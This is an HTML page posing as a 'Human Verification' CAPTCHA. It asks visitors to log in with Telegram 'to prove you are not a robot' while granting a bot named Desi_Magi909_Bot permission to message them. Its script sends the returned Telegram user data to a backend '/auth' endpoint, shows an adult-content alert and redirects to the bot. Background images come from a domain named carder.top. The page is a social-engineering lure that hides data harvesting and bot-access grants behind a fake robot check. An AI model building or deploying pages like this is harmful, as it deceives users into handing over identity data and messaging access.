<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
        body { 
            background-color: #111; background-size: cover; background-position: center; 
            height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        .overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.7); z-index: 1;
        }
        .container {
            position: relative; z-index: 2; width: 92%; max-width: 400px;
        }
        .content-box {
            background: rgba(35, 35, 35, 0.9); backdrop-filter: blur(15px);
            border: 2px solid #0088CC; border-radius: 20px; padding: 40px 20px;
            text-align: center; color: white;
            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="container">
        <div class="content-box">
            
            <h2 style="margin-bottom: 15px; color: #0088CC;">Human Verification</h2>
            <p style="margin-bottom: 30px; font-size: 14px; color: #ddd;">
                Please log in with your Telegram account to prove you are not a robot.
            </p>

            <!-- Telegram Login Widget -->
            <div style="display: flex; justify-content: center;">
                <script async src="https://telegram.org/js/telegram-widget.js?22" 
                        data-telegram-login="Desi_Magi909_Bot" 
                        data-size="large" 
                        data-onauth="onTelegramAuth(user)" 
                        data-request-access="write"></script>
            </div>

        </div>
    </div>

    <!-- ব্যাকএন্ডে ডেটা পাঠানোর জাভাস্ক্রিপ্ট -->
    <script>
        function onTelegramAuth(user) {
            fetch('/auth', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(user)
            })
            .then(response => response.json())
            .then(data => {
                alert("Verification Successful! 🔞");
                window.location.href = "https://t.me/Desi_Magi909_Bot?start=start"; 
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
        
        // Background Images Script
        const images = [
            "https://carder.top/imagens/1791918460640-323067073.jpg",
            "https://carder.top/imagens/1791918463157-201532531.jpg",
            "https://carder.top/imagens/1791918465627-141146469.jpg"
        ];
        document.body.style.backgroundImage = "url('" + images[Math.floor(Math.random() * images.length)] + "')";
    </script>
</body>
</html>
